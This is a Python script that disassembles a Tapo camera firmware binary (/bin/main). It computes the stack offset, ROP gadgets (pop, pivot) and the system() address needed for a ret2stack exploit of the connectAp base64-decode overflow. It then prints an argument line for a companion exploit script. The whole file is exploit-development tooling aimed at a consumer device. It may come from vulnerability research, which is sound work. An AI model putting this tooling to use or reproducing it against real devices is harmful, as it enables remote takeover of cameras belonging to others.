#!/usr/bin/env python3
"""Derive the connectAp ret2stack offsets from a Tapo `/bin/main`.

The chain needs four numbers, all build-specific:

  offset  distance from the decode buffer to the saved pc
  pop     `pop {r3..r11, pc}`
  system  the `system` PLT stub
  pivot   `add r1, sp, #4 ; mov r0, sp ; blx r3`

This finds them from the disassembly instead of guessing. The sink is the
function that passes a stack address to the `mbedtls_base64_decode` wrapper;
its frame is the sum of its `sub sp` plus the pushed registers, and the buffer
offset is the `add rX, sp, #imm` handed to the decoder.

  find_chain.py /path/to/main [--objdump arm-none-eabi-objdump]

Prints a shell-ready argument line, or names what it could not find.
"""
import argparse
import re
import subprocess
import sys

INS = re.compile(r"^\s*([0-9a-f]+):\s+([0-9a-f]{8})\s+(\S+)\s*(.*)$")
PUSH = re.compile(r"^push\s*\{([^}]*)\}")
SUB = re.compile(r"^sub\s+sp,\s*sp,\s*#(\d+)")
ADDSP = re.compile(r"^add\s+(r\d+|fp|sl|ip|lr),\s*sp,\s*#(\d+)")
POP_PC = re.compile(r"^pop\s*\{([^}]*\bpc\b[^}]*)\}")
BL_DECODE = re.compile(r"^bl\s+.*base64_decode")


def disasm(path: str, objdump: str) -> tuple[list[tuple[int, str, str]], dict[int, str]]:
    out = subprocess.run([objdump, "-d", "--no-show-raw-insn", path],
                         capture_output=True, text=True).stdout
    rows, symbols = [], {}
    for line in out.splitlines():
        sym = re.match(r"^([0-9a-f]+) <(.+)>:$", line)
        if sym:
            symbols[int(sym.group(1), 16)] = sym.group(2)
            continue
        m = re.match(r"^\s*([0-9a-f]+):\s+(\S+)\s*(.*)$", line)
        if m:
            rows.append((int(m.group(1), 16), m.group(2), m.group(3).strip()))
    return rows, symbols


def find_gadgets(rows, symbols):
    pop = pivot = system = None
    for addr, name in symbols.items():
        if name in ("system@plt", "system"):
            system = addr
    for i, (addr, mnem, ops) in enumerate(rows):
        if pop is None and mnem == "pop" and ops.startswith("{"):
            regs = [r.strip() for r in ops.strip("{}").split(",")]
            if regs == ["r3", "r4", "r5", "r6", "r7", "r8", "r9", "r10", "r11", "pc"] or \
                    regs == ["r3", "r4", "r5", "r6", "r7", "r8", "r9", "sl", "fp", "pc"]:
                pop = addr
        if pivot is None and mnem == "add" and ops.startswith("r1, sp, #4"):
            nxt = rows[i + 1:i + 3]
            if (len(nxt) == 2 and nxt[0][1] == "mov" and nxt[0][2].startswith("r0, sp")
                    and nxt[1][1] == "blx" and nxt[1][2].startswith("r3")):
                pivot = addr
    return pop, pivot, system


def find_sink(rows):
    """Return (buffer_offset, pc_offset) for the frame that decodes into the stack.

    The stack buffer lives in the *caller* of the base64 wrapper, so the call
    sites to look at are `bl` into any function that itself calls the decoder.
    """
    wrappers = set()
    for i, (addr, mnem, ops) in enumerate(rows):
        if BL_DECODE.match("%s %s" % (mnem, ops)):
            for j in range(i, max(-1, i - 400), -1):
                if PUSH.match("%s %s" % (rows[j][1], rows[j][2])) and "lr" in rows[j][2]:
                    wrappers.add(rows[j][0])
                    break
    best = None
    for i, (addr, mnem, ops) in enumerate(rows):
        if mnem != "bl":
            continue
        target = ops.split()[0] if ops else ""
        if not target.startswith("0x") and not re.match(r"^[0-9a-f]+$", target):
            continue
        if int(target, 16) not in wrappers:
            continue
        # walk back for `add rX, sp, #imm` used as the destination (r2)
        dest = None
        for j in range(i - 1, max(-1, i - 40), -1):
            m = ADDSP.match("%s %s" % (rows[j][1], rows[j][2]))
            if m:
                dest = (m.group(1), int(m.group(2)))
                break
        if dest is None:
            continue
        # walk back to the function prologue: push {..., lr} then the subs
        frame = 0
        pushed = 0
        for j in range(i, max(-1, i - 400), -1):
            m = PUSH.match("%s %s" % (rows[j][1], rows[j][2]))
            if m and "lr" in m.group(1):
                pushed = 4 * (len([r for r in m.group(1).split(",") if r.strip()]) )
                for k in range(j + 1, i):
                    s = SUB.match("%s %s" % (rows[k][1], rows[k][2]))
                    if s:
                        frame += int(s.group(1))
                total = frame + pushed
                # the decode destination must survive until the call, so a
                # callee-saved register is the real buffer; scratch registers
                # are temporaries. Rank those first, then by buffer size.
                saved = dest[0] in ("fp", "sl", "r4", "r5", "r6", "r7", "r8", "r9", "r10", "r11")
                cand = (saved, dest[1], total - 4 - dest[1])
                if best is None or cand[:2] > best[:2]:
                    best = cand
                break
    return (best[1], best[2]) if best else None


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("binary")
    ap.add_argument("--objdump", default="arm-none-eabi-objdump")
    a = ap.parse_args()

    rows, symbols = disasm(a.binary, a.objdump)
    if not rows:
        sys.exit("no disassembly (wrong objdump or not an ARM ELF)")
    sink = find_sink(rows)
    pop, pivot, system = find_gadgets(rows, symbols)
    missing = [n for n, v in (("sink", sink), ("pop", pop), ("pivot", pivot),
                              ("system", system)) if v is None]
    if sink:
        print("buffer_offset=0x%x pc_offset=0x%x" % sink)
    for name, val in (("pop", pop), ("pivot", pivot), ("system", system)):
        print("%-7s %s" % (name, hex(val) if val is not None else "NOT FOUND"))
    if missing:
        print("missing:", ", ".join(missing))
        return 1
    print("\ntapo_connectap_rop.py <host> --offset 0x%x --pop 0x%x --pivot 0x%x --system 0x%x"
          % (sink[1], pop, pivot, system))
    return 0


if __name__ == "__main__":
    sys.exit(main())
